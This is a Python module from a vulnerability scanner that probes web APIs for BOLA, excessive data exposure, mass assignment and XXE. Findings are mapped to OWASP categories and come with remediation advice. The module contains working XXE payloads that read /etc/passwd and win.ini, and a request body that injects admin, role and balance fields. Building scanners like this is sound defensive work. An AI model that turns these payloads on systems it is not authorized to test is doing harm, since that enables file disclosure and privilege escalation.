"""API scanner: BOLA (path-based), excessive data exposure, mass assignment, XXE.

Mapping: OWASP API Security Top 10:2023 (API1 BOLA, API3 Broken Object Property
Level Authorization — both the read half, excessive data exposure, and the write
half, mass assignment) and OWASP A05:2025 (XXE as injection).
"""
from __future__ import annotations

import json
from typing import Any

from ...core.http import HttpClient
from ...core.logging import AuditLogger
from ...core.models import Evidence, Finding, Severity, Target
from ...core.scope import ActionClass, ScopeGuard
from . import detectors as det

# Fields whose presence in an API response suggests excessive data exposure.
SENSITIVE_FIELDS = ["password", "passwd", "ssn", "pesel", "secret", "token", "api_key",
                    "apikey", "credit_card", "card_number", "role", "is_admin", "private_key"]

# Privileged object properties an attacker smuggles into a write to escalate
# (mass assignment / BOPLA write half, API3:2023 / CWE-915).
MASS_ASSIGN_FIELDS = ["role", "is_admin", "isAdmin", "admin", "is_superuser",
                      "superuser", "privilege", "account_type", "plan", "membership",
                      "verified", "email_verified", "is_active", "status", "user_type",
                      "balance", "credits"]
# Distinctive sentinels. A vulnerable endpoint that blindly binds client input to
# its model attributes echoes the *privileged* sentinel back; the bogus control
# field (not a real model attribute) is dropped. That gap separates a genuine
# mass-assignment sink from a dumb request-echo endpoint (keeps false positives low).
_MA_PRIV = "bezMASSPRIV7X4Q"
_MA_CTRL = "bezCTRL9Z2K"
_MA_BOGUS = "bez_control_field_9z2k"


def _bound_fields(obj: Any, sentinel: str, names: list[str]) -> list[str]:
    """Return the privileged property names in `obj` whose value equals `sentinel`
    (walks nested dicts/lists), i.e. the fields the server actually bound."""
    found: set[str] = set()

    def walk(node: Any) -> None:
        if isinstance(node, dict):
            for k, v in node.items():
                if k in names and v == sentinel:
                    found.add(k)
                walk(v)
        elif isinstance(node, list):
            for it in node:
                walk(it)

    walk(obj)
    return sorted(found)

XXE_PAYLOAD = ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM '
               '"file:///etc/passwd">]><root>&xxe;</root>')


class ApiScanner:
    name = "api-scanner (native)"

    def __init__(self, http: HttpClient, log: AuditLogger, guard: ScopeGuard):
        self.http = http
        self.log = log
        self.guard = guard

    def scan(self, target: Target, rest_resources: list[str], xml_endpoints: list[str]) -> list[Finding]:
        """rest_resources: base collection paths, e.g. '/api/orders' (we append /{id}).
        xml_endpoints: paths accepting XML (POST), e.g. '/xml'."""
        base = target.url.rstrip("/")
        self.guard.authorize(base, ActionClass.ACTIVE)
        findings: list[Finding] = []
        for res in rest_resources:
            findings += self._bola(base, res)
            findings += self._excessive_exposure(base, res)
            findings += self._mass_assignment(base, res)
        for ep in xml_endpoints:
            findings += self._xxe(base, ep)
        return findings

    def _bola(self, base: str, resource: str) -> list[Finding]:
        out: list[Finding] = []
        r1 = self.http.get(f"{base}{resource}/1")
        r2 = self.http.get(f"{base}{resource}/2")
        if (r1.status == 200 and r2.status == 200 and r1.text and r2.text
                and r1.text != r2.text
                and "unauthor" not in r2.text.lower() and "forbidden" not in r2.text.lower()):
            self.log.action(base, self.name, f"BOLA probe {resource}/{{id}}")
            self._report(out, Finding(
                title=f"Broken Object Level Authorization (BOLA) w {resource}/{{id}}",
                severity=Severity.HIGH, owasp="API1:2023 BOLA", cwe="CWE-639",
                target=f"{base}{resource}/2", component=f"{resource}/{{id}}", source_tool=self.name,
                description="Access to an object after changing the identifier in the path without access control.",
                impact="Reading/manipulating other users' data — the most common API vulnerability.",
                recommendation="Enforce object-level authorization per request (owner == requester).",
                evidence=Evidence(payload=f"{resource}/1 vs {resource}/2", response=r2.text[:250])))
        return out

    def _excessive_exposure(self, base: str, resource: str) -> list[Finding]:
        out: list[Finding] = []
        r = self.http.get(f"{base}{resource}/1")
        try:
            data = json.loads(r.text)
        except json.JSONDecodeError:
            return out
        blob = json.dumps(data).lower()
        found = [f for f in SENSITIVE_FIELDS if f'"{f}"' in blob]
        if found:
            self.log.action(base, self.name, f"exposure probe {resource}/1")
            self._report(out, Finding(
                title=f"Excessive data exposure in {resource}/{{id}}: {', '.join(found)}",
                severity=Severity.HIGH, owasp="API3:2023 Broken Object Property Level Authorization",
                cwe="CWE-213", target=f"{base}{resource}/1", component=f"{resource}/{{id}}",
                source_tool=self.name,
                description=f"The API response contains sensitive fields: {', '.join(found)}.",
                impact="Leak of confidential object properties (passwords, roles, PII) to the client.",
                recommendation="Return only the needed fields (allowlist/DTO); do not serialize entire entities.",
                evidence=Evidence(response=r.text[:300])))
        return out

    def _mass_assignment(self, base: str, resource: str) -> list[Finding]:
        """Mass assignment / BOPLA write half: send a write carrying privileged
        properties plus one bogus control field. If the endpoint reflects the
        privileged sentinel (bound it to the object) but NOT the control sentinel,
        it blindly binds client-supplied model attributes — an escalation sink."""
        out: list[Finding] = []
        body: dict[str, Any] = {f: _MA_PRIV for f in MASS_ASSIGN_FIELDS}
        body[_MA_BOGUS] = _MA_CTRL
        collection = f"{base}{resource}"
        item = f"{base}{resource}/1"
        for method, url in (("POST", collection), ("PUT", item), ("PATCH", item)):
            r = self.http.request(method, url, json=body)
            if r.status == 0 or not r.text:
                continue
            try:
                data = json.loads(r.text)
            except json.JSONDecodeError:
                continue  # only trust structured responses (avoid HTML-echo FPs)
            bound = _bound_fields(data, _MA_PRIV, MASS_ASSIGN_FIELDS)
            if not bound or _MA_CTRL in r.text:
                continue  # nothing bound, or endpoint echoes everything -> not a sink
            self.log.action(base, self.name, f"mass-assignment probe {method} {resource}")
            self._report(out, Finding(
                title=f"Mass Assignment (BOPLA) in {method} {resource}: {', '.join(bound)}",
                severity=Severity.HIGH,
                owasp="API3:2023 Broken Object Property Level Authorization",
                cwe="CWE-915", target=url, component=resource, source_tool=self.name,
                description=("The endpoint bound client-supplied privileged properties "
                             f"({', '.join(bound)}) to the object without an allowlist. A "
                             "bogus non-model field was dropped, so the server selectively "
                             "bound real (privileged) attributes from untrusted input."),
                impact="Privilege escalation / object tampering — e.g. self-grant admin role, "
                       "verified status, or an inflated balance via an extra JSON field.",
                recommendation="Bind only an explicit allowlist of client-writable properties "
                               "(input DTO / schema); never map the request body onto the entity.",
                evidence=Evidence(payload=json.dumps(body)[:250], response=r.text[:300])))
            return out
        return out

    def _xxe(self, base: str, endpoint: str) -> list[Finding]:
        out: list[Finding] = []
        # several file-read XXE shapes: SYSTEM entity, php filter wrapper, UTF-16, parameter entity
        payloads = [
            XXE_PAYLOAD,
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
             '"php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>'),
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">'
             '<!ENTITY y SYSTEM "file:///c:/windows/win.ini">]><r>&x;&y;</r>'),
            ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY>'
             '<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
        ]
        for i, pl in enumerate(payloads):
            for ctype in ("application/xml", "text/xml"):
                r = self.http.post(f"{base}{endpoint}", headers={"Content-Type": ctype}, content=pl)
                if det.traversal_ok(r.text):
                    self.log.action(base, self.name, f"XXE probe POST {endpoint} (variant {i})")
                    self._report(out, Finding(
                        title=f"XML External Entity (XXE) in POST {endpoint}",
                        severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-611",
                        target=f"{base}{endpoint}", component=endpoint, source_tool=self.name,
                        description="The XML parser expands external entities — reading a file (file:///etc/passwd).",
                        impact="Reading server files, SSRF, potentially DoS (billion laughs).",
                        recommendation="Disable external entity expansion and DTDs in the XML parser.",
                        evidence=Evidence(payload=pl, response=r.text[:250])))
                    return out
        return out

    def _report(self, out: list[Finding], f: Finding) -> None:
        self.log.finding(f.title, f.severity.value, owasp=f.owasp)
        out.append(f)
